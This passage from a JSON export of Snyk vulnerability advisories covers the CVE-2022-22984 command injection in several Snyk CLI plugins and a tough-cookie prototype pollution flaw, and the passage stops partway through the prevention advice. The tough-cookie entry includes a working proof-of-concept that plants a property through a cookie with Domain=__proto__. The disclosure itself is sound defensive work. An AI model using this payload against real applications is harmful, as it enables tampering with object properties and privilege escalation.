        "description": "## Overview\n[snyk-gradle-plugin](https://www.npmjs.com/package/snyk-gradle-plugin) is a plugin for the Snyk CLI tool, providing dependency metadata for Gradle projects.\n\nAffected versions of this package are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342).\r\n\r\nA successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.\r\n\r\nIn order to exploit this vulnerability, a user would have to execute the `snyk test` command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.\r\n\r\nThis issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.\r\n\r\nThe issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.\n## Remediation\nUpgrade `snyk-gradle-plugin` to version 3.24.5 or higher.\n## References\n- [GitHub Commit (CLI)](https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a)\n- [GitHub Commit (snyk-cocoapods-plugin)](https://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381)\n- [GitHub Commit (snyk-docker-plugin)](https://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357)\n- [GitHub Commit (snyk-gradle-plugin)](https://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009)\n- [GitHub Commit (snyk-hex-plugin)](https://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3)\n- [GitHub Commit (snyk-mvn-plugin)](https://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50)\n- [GitHub Commit (snyk-python-plugin)](https://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4)\n- [GitHub Commit (snyk-sbt-plugin)](https://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437)\n- [Imperva Blog Post](https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/)\n- [Snyk Blog Post](https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/)\n",
        "created_at": "2022-10-03T13:38:24Z",
        "updated_at": "2024-03-11T09:52:49Z",
        "problems": [
          {
            "id": "CVE-2022-22984",
            "source": "CVE"
          },
          {
            "id": "CWE-77",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.24.5 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.24.5"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.24.5"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-09-29T13:34:36Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-11-30T10:54:34Z",
            "references": [
              {
                "url": "https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a",
                "title": "GitHub Commit (CLI)"
              },
              {
                "url": "https://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381",
                "title": "GitHub Commit (snyk-cocoapods-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357",
                "title": "GitHub Commit (snyk-docker-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009",
                "title": "GitHub Commit (snyk-gradle-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3",
                "title": "GitHub Commit (snyk-hex-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50",
                "title": "GitHub Commit (snyk-mvn-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4",
                "title": "GitHub Commit (snyk-python-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437",
                "title": "GitHub Commit (snyk-sbt-plugin)"
              },
              {
                "url": "https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/",
                "title": "Imperva Blog Post"
              },
              {
                "url": "https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/",
                "title": "Snyk Blog Post"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-SNYKMVNPLUGIN-3038623",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Command Injection",
        "description": "## Overview\n[snyk-mvn-plugin](https://www.npmjs.com/package/snyk-mvn-plugin) is a plugin for the Snyk CLI tool, providing dependency metadata for Maven projects that use mvn and have a pom.xml file.\n\nAffected versions of this package are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342).\r\n\r\nA successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.\r\n\r\nIn order to exploit this vulnerability, a user would have to execute the `snyk test` command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.\r\n\r\nThis issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.\r\n\r\nThe issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.\n## Remediation\nUpgrade `snyk-mvn-plugin` to version 2.31.3 or higher.\n## References\n- [GitHub Commit (CLI)](https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a)\n- [GitHub Commit (snyk-cocoapods-plugin)](https://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381)\n- [GitHub Commit (snyk-docker-plugin)](https://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357)\n- [GitHub Commit (snyk-gradle-plugin)](https://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009)\n- [GitHub Commit (snyk-hex-plugin)](https://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3)\n- [GitHub Commit (snyk-mvn-plugin)](https://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50)\n- [GitHub Commit (snyk-python-plugin)](https://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4)\n- [GitHub Commit (snyk-sbt-plugin)](https://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437)\n- [Imperva Blog Post](https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/)\n- [Snyk Blog Post](https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/)\n",
        "created_at": "2022-10-03T13:36:45Z",
        "updated_at": "2024-03-11T09:52:49Z",
        "problems": [
          {
            "id": "CVE-2022-22984",
            "source": "CVE"
          },
          {
            "id": "CWE-77",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.31.3 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.31.3"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.31.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-09-29T13:34:36Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-11-30T10:54:34Z",
            "references": [
              {
                "url": "https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a",
                "title": "GitHub Commit (CLI)"
              },
              {
                "url": "https://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381",
                "title": "GitHub Commit (snyk-cocoapods-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357",
                "title": "GitHub Commit (snyk-docker-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009",
                "title": "GitHub Commit (snyk-gradle-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3",
                "title": "GitHub Commit (snyk-hex-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50",
                "title": "GitHub Commit (snyk-mvn-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4",
                "title": "GitHub Commit (snyk-python-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437",
                "title": "GitHub Commit (snyk-sbt-plugin)"
              },
              {
                "url": "https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/",
                "title": "Imperva Blog Post"
              },
              {
                "url": "https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/",
                "title": "Snyk Blog Post"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-SNYKPYTHONPLUGIN-3039677",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Command Injection",
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342).\r\n\r\nA successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.\r\n\r\nIn order to exploit this vulnerability, a user would have to execute the `snyk test` command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.\r\n\r\nThis issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.\r\n\r\nThe issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.\n## Remediation\nUpgrade `snyk-python-plugin` to version 1.24.2 or higher.\n## References\n- [GitHub Commit (CLI)](https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a)\n- [GitHub Commit (snyk-cocoapods-plugin)](https://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381)\n- [GitHub Commit (snyk-docker-plugin)](https://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357)\n- [GitHub Commit (snyk-gradle-plugin)](https://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009)\n- [GitHub Commit (snyk-hex-plugin)](https://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3)\n- [GitHub Commit (snyk-mvn-plugin)](https://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50)\n- [GitHub Commit (snyk-python-plugin)](https://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4)\n- [GitHub Commit (snyk-sbt-plugin)](https://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437)\n- [Imperva Blog Post](https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/)\n- [Snyk Blog Post](https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/)\n",
        "created_at": "2022-10-04T11:33:55Z",
        "updated_at": "2024-03-11T09:52:49Z",
        "problems": [
          {
            "id": "CVE-2022-22984",
            "source": "CVE"
          },
          {
            "id": "CWE-77",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.24.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.24.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.24.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-09-29T13:34:36Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-11-30T10:54:34Z",
            "references": [
              {
                "url": "https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a",
                "title": "GitHub Commit (CLI)"
              },
              {
                "url": "https://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381",
                "title": "GitHub Commit (snyk-cocoapods-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357",
                "title": "GitHub Commit (snyk-docker-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009",
                "title": "GitHub Commit (snyk-gradle-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3",
                "title": "GitHub Commit (snyk-hex-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50",
                "title": "GitHub Commit (snyk-mvn-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4",
                "title": "GitHub Commit (snyk-python-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437",
                "title": "GitHub Commit (snyk-sbt-plugin)"
              },
              {
                "url": "https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/",
                "title": "Imperva Blog Post"
              },
              {
                "url": "https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/",
                "title": "Snyk Blog Post"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-SNYKSBTPLUGIN-3038626",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Command Injection",
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342).\r\n\r\nA successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.\r\n\r\nIn order to exploit this vulnerability, a user would have to execute the `snyk test` command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.\r\n\r\nThis issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.\r\n\r\nThe issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.\n## Remediation\nUpgrade `snyk-sbt-plugin` to version 2.16.2 or higher.\n## References\n- [GitHub Commit (CLI)](https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a)\n- [GitHub Commit (snyk-cocoapods-plugin)](https://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381)\n- [GitHub Commit (snyk-docker-plugin)](https://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357)\n- [GitHub Commit (snyk-gradle-plugin)](https://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009)\n- [GitHub Commit (snyk-hex-plugin)](https://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3)\n- [GitHub Commit (snyk-mvn-plugin)](https://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50)\n- [GitHub Commit (snyk-python-plugin)](https://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4)\n- [GitHub Commit (snyk-sbt-plugin)](https://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437)\n- [Imperva Blog Post](https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/)\n- [Snyk Blog Post](https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/)\n",
        "created_at": "2022-10-03T13:54:17Z",
        "updated_at": "2024-03-11T09:52:49Z",
        "problems": [
          {
            "id": "CVE-2022-22984",
            "source": "CVE"
          },
          {
            "id": "CWE-77",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.16.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.16.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.16.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-09-29T13:34:36Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-11-30T10:54:34Z",
            "references": [
              {
                "url": "https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a",
                "title": "GitHub Commit (CLI)"
              },
              {
                "url": "https://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381",
                "title": "GitHub Commit (snyk-cocoapods-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357",
                "title": "GitHub Commit (snyk-docker-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009",
                "title": "GitHub Commit (snyk-gradle-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3",
                "title": "GitHub Commit (snyk-hex-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50",
                "title": "GitHub Commit (snyk-mvn-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4",
                "title": "GitHub Commit (snyk-python-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437",
                "title": "GitHub Commit (snyk-sbt-plugin)"
              },
              {
                "url": "https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/",
                "title": "Imperva Blog Post"
              },
              {
                "url": "https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/",
                "title": "Snyk Blog Post"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-SNYKSNYKCOCOAPODSPLUGIN-3038625",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Command Injection",
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342).\r\n\r\nA successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.\r\n\r\nIn order to exploit this vulnerability, a user would have to execute the `snyk test` command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.\r\n\r\nThis issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.\r\n\r\nThe issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.\n## Remediation\nUpgrade `@snyk/snyk-cocoapods-plugin` to version 2.5.3 or higher.\n## References\n- [GitHub Commit (CLI)](https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a)\n- [GitHub Commit (snyk-cocoapods-plugin)](https://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381)\n- [GitHub Commit (snyk-docker-plugin)](https://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357)\n- [GitHub Commit (snyk-gradle-plugin)](https://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009)\n- [GitHub Commit (snyk-hex-plugin)](https://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3)\n- [GitHub Commit (snyk-mvn-plugin)](https://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50)\n- [GitHub Commit (snyk-python-plugin)](https://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4)\n- [GitHub Commit (snyk-sbt-plugin)](https://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437)\n- [Imperva Blog Post](https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/)\n- [Snyk Blog Post](https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/)\n",
        "created_at": "2022-10-03T13:44:31Z",
        "updated_at": "2024-03-11T09:52:49Z",
        "problems": [
          {
            "id": "CVE-2022-22984",
            "source": "CVE"
          },
          {
            "id": "CWE-77",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.5.3 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.5.3"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.5.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-09-29T13:34:36Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-11-30T10:54:34Z",
            "references": [
              {
                "url": "https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a",
                "title": "GitHub Commit (CLI)"
              },
              {
                "url": "https://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381",
                "title": "GitHub Commit (snyk-cocoapods-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357",
                "title": "GitHub Commit (snyk-docker-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009",
                "title": "GitHub Commit (snyk-gradle-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3",
                "title": "GitHub Commit (snyk-hex-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50",
                "title": "GitHub Commit (snyk-mvn-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4",
                "title": "GitHub Commit (snyk-python-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437",
                "title": "GitHub Commit (snyk-sbt-plugin)"
              },
              {
                "url": "https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/",
                "title": "Imperva Blog Post"
              },
              {
                "url": "https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/",
                "title": "Snyk Blog Post"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-TOUGHCOOKIE-5672873",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[tough-cookie](https://www.npmjs.com/package/tough-cookie) is a RFC6265 Cookies and CookieJar module for Node.js.\n\nAffected versions of this package are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in `rejectPublicSuffixes=false` mode. Due to an issue with the manner in which the objects are initialized, an attacker can expose or modify a limited amount of property information on those objects. There is no impact to availability.\n## PoC\n```\r\n// PoC.js\r\nasync function main(){\r\nvar tough = require(\"tough-cookie\");\r\nvar cookiejar = new tough.CookieJar(undefined,{rejectPublicSuffixes:false});\r\n// Exploit cookie\r\nawait cookiejar.setCookie(\r\n  \"Slonser=polluted; Domain=__proto__; Path=/notauth\",\r\n  \"https://__proto__/admin\"\r\n);\r\n// normal cookie\r\nvar cookie = await cookiejar.setCookie(\r\n  \"Auth=Lol; Domain=google.com; Path=/notauth\",\r\n  \"https://google.com/\"\r\n);\r\n\r\n//Exploit cookie\r\nvar a = {};\r\nconsole.log(a[\"/notauth\"][\"Slonser\"])\r\n}\r\nmain();\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze 